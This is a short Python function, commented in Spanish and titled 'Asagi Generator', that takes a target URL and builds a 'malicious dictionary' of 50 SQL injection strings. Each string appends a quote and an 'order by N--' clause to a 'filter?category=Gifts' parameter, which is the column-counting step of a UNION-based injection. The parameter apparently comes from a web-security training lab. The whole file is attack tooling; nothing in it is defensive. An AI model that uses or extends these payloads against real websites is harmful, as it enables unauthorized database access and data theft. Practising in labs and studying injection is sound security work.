def Uno(url_objetivo):
    diccionario_maligno = {}

    print("[--] Asagi Generator\n")
    print("URL Objetivo: ", url_objetivo)

    '''Creacion de las cadenas'''
    print("\t [i] Creando lista de cadenas maliciosas")
    base_load_string = "filter?category=Gifts"

    '''Procesamiento. Generacion de diccionario maligno'''
    for xxx in range(0,50):
        diccionario_maligno[xxx] = base_load_string + "'order+by+" +str(xxx)+"--"
    print("\t [OK] Diccionario maligno creado con exito\n")
    return diccionario_maligno